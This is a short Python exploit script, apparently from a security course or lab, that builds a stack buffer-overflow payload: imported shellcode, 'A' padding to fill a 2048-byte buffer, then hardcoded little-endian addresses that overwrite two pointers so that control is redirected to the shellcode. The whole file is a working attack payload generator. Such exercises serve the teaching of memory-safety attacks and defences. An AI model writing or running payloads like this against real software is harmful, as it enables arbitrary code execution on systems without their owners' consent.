#!/usr/bin/env python3

import sys
from shellcode import shellcode

#Address where the 2064 byte buffer starts (Where the shellcode will be located)
buf_address = 0x7ffffff40a30

#Address of the return address (Where to write)
return_address_loc = 0x7ffffff41248

payload = shellcode

#Bytes 54-2047: Padding to fill the rest of the buffer
padd_to_a = 2048 - len(shellcode)
payload += b"A" * padd_to_a #Padding to reach return address

# Bytes 2048-2055: Overwrite 'a' with shellcode address
payload += buf_address.to_bytes(8, 'little')

# Byetes 2056-2063: Overwrite 'p' with address of return address
payload += return_address_loc.to_bytes(8, 'little') 

sys.stdout.buffer.write(payload) #show output based on the input payload